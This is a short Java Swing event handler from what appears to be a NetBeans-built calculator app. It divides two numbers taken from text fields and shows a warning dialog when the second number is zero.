    //Divide numbers
    private void divideActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_divideActionPerformed
        checkValid();
        double result;
        double first = Double.parseDouble(first_num.getText());
        double second = Double.parseDouble(second_num.getText());
        
        if(second == 0) {
            JOptionPane.showMessageDialog(this, "Second Number Cannot Be 0", "Invalid Second Number", JOptionPane.WARNING_MESSAGE);
        }
        else {
        result = first / second;
        
        Ans_Lab.setText("The Quotient Is: " + result);
        }
    }//GEN-LAST:event_divideActionPerformed
    
